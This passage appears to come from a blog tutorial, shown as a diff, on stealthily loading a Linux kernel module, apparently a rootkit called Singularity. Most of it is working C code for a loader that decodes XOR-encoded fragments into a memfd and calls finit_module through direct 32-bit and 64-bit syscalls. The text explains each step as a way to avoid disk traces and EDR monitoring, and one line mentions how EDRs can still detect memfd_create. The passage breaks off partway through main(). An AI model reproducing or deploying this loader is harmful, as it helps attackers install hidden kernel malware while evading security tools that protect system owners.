+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="custom-loader-via-memfd_create">Custom Loader via memfd_create<a hidden class="anchor" aria-hidden="true" href="#custom-loader-via-memfd_create">#</a></h4>
+<p>Instead of using insmod or modprobe, we implement a custom loader that:</p>
+<ul>
+<li>Reads encrypted fragments from disk</li>
+<li>Decodes them in memory</li>
+<li>Creates an anonymous memory file descriptor</li>
+<li>Writes the reconstructed module to the memory FD</li>
+<li>Loads the module via direct syscall</li>
+</ul>
+<h4 id="loader-architecture">Loader Architecture<a hidden class="anchor" aria-hidden="true" href="#loader-architecture">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * Singularity Loader
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 1. Uses 32-bit syscall (finit_module) via inline assembly
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 2. Reconstructs .ko from fragments in memory
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 3. Decodes XOR encoding
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 4. Uses memfd_create to avoid disk
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 5. Direct syscall to avoid libc wrapper
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * Compile: gcc -o loader loader.c -static
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * Usage: ./loader fragments/
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Syscall numbers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define __NR_finit_module   313
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define __NR_memfd_create   319
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Settings
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define MAX_FRAGMENTS       256
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MAX_CHUNK_SIZE      (1024 * 1024)  </span><span class="c1">// 1MB
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define XOR_KEY_SIZE        16
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MODULE_FLAGS        0
+</span></span></span></code></pre></div><h4 id="direct-syscall-implementation">Direct Syscall Implementation<a hidden class="anchor" aria-hidden="true" href="#direct-syscall-implementation">#</a></h4>
+<p>To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Direct 64-bit syscall
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kr">inline</span> <span class="kt">long</span> <span class="nf">syscall_direct_64</span><span class="p">(</span><span class="kt">long</span> <span class="n">number</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg2</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">register</span> <span class="kt">long</span> <span class="n">r10</span> <span class="k">asm</span><span class="p">(</span><span class="s">&#34;r10&#34;</span><span class="p">)</span> <span class="o">=</span> <span class="n">arg3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;syscall&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;=a&#34;</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;0&#34;</span> <span class="p">(</span><span class="n">number</span><span class="p">),</span> <span class="s">&#34;D&#34;</span> <span class="p">(</span><span class="n">arg1</span><span class="p">),</span> <span class="s">&#34;S&#34;</span> <span class="p">(</span><span class="n">arg2</span><span class="p">),</span> <span class="s">&#34;d&#34;</span> <span class="p">(</span><span class="n">r10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Direct 32-bit syscall
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kr">inline</span> <span class="kt">long</span> <span class="nf">syscall_direct_32</span><span class="p">(</span><span class="kt">long</span> <span class="n">number</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg2</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;int $0x80&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;=a&#34;</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;0&#34;</span> <span class="p">(</span><span class="n">number</span><span class="p">),</span> <span class="s">&#34;b&#34;</span> <span class="p">(</span><span class="n">arg1</span><span class="p">),</span> <span class="s">&#34;c&#34;</span> <span class="p">(</span><span class="n">arg2</span><span class="p">),</span> <span class="s">&#34;d&#34;</span> <span class="p">(</span><span class="n">arg3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;memory&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Why This Works:</p>
+<ul>
+<li>32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction</li>
+</ul>
+<h4 id="memory-file-descriptor-creation">Memory File Descriptor Creation<a hidden class="anchor" aria-hidden="true" href="#memory-file-descriptor-creation">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">create_memfd</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">syscall_direct_64</span><span class="p">(</span><span class="n">__NR_memfd_create</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[!] memfd_create failed: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">fd</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] memfd created: fd=%ld (%s)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>memfd_create creates an anonymous file that:</p>
+<p>Exists only in memory (tmpfs)</p>
+<ul>
+<li>Automatically deleted when all file descriptors are closed</li>
+<li>Can be passed to finit_module() like a regular file</li>
+</ul>
+<p>Remember that EDRs can monitor <code>memfd_create()</code> calls, and it can also be detected in <code>/proc/&lt;pid&gt;/fd/</code></p>
+<h4 id="xor-decoder">XOR Decoder<a hidden class="anchor" aria-hidden="true" href="#xor-decoder">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">xor_decode</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="fragment-loading">Fragment Loading<a hidden class="anchor" aria-hidden="true" href="#fragment-loading">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">load_fragments</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dir_path</span><span class="p">,</span> <span class="n">Fragment</span> <span class="o">*</span><span class="n">fragments</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">num_fragments</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="n">dir_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dir</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[!] opendir&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Scanning fragments in: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dir_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">entry</span> <span class="o">=</span> <span class="nf">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="n">MAX_FRAGMENTS</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Look for chunk_XXX.bin
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="s">&#34;chunk_&#34;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> 
+</span></span><span class="line"><span class="cl">            <span class="nf">strstr</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="s">&#34;.bin&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">filepath</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">snprintf</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filepath</span><span class="p">),</span> <span class="s">&#34;%s/%s&#34;</span><span class="p">,</span> <span class="n">dir_path</span><span class="p">,</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// Extract index
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// Read fragment
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[!] Error opening %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filepath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="nf">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">fsize</span> <span class="o">=</span> <span class="nf">ftell</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">fsize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="kt">size_t</span> <span class="n">read_bytes</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fsize</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">read_bytes</span> <span class="o">!=</span> <span class="n">fsize</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">fragments</span><span class="p">[</span><span class="n">count</span><span class="p">].</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fragments</span><span class="p">[</span><span class="n">count</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="n">fsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fragments</span><span class="p">[</span><span class="n">count</span><span class="p">].</span><span class="n">index</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">count</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Fragment %d: %s (%ld bytes)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">fsize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">num_fragments</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Sort fragments by index
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">count</span> <span class="o">-</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">fragments</span><span class="p">[</span><span class="n">j</span><span class="p">].</span><span class="n">index</span> <span class="o">&gt;</span> <span class="n">fragments</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">index</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Fragment</span> <span class="n">temp</span> <span class="o">=</span> <span class="n">fragments</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fragments</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">fragments</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fragments</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="module-loading">Module Loading<a hidden class="anchor" aria-hidden="true" href="#module-loading">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">load_module_stealthy</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">params</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Loading module via direct syscall...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Try 32-bit syscall first (more stealthy)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">syscall_direct_32</span><span class="p">(</span><span class="n">__NR_finit_module</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">params</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Fallback to 64-bit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ret</span> <span class="o">=</span> <span class="nf">syscall_direct_64</span><span class="p">(</span><span class="n">__NR_finit_module</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">params</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;[!] finit_module failed: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">ret</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Module loaded successfully!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="complete-loading-workflow">Complete Loading Workflow<a hidden class="anchor" aria-hidden="true" href="#complete-loading-workflow">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 1. Load fragments
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Fragment</span> <span class="n">fragments</span><span class="p">[</span><span class="n">MAX_FRAGMENTS</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">num_fragments</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">load_fragments</span><span class="p">(</span><span class="n">fragments_dir</span><span class="p">,</span> <span class="n">fragments</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num_fragments</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 2. Parse metadata (get XOR key)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">XOR_KEY_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">is_encoded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">parse_metadata</span><span class="p">(</span><span class="n">fragments_dir</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">is_encoded</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 3. Create memfd
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">memfd</span> <span class="o">=</span> <span class="nf">create_memfd</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 4. Reconstruct module in memfd
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_fragments</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">fragments</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span><span class="p">;</span>
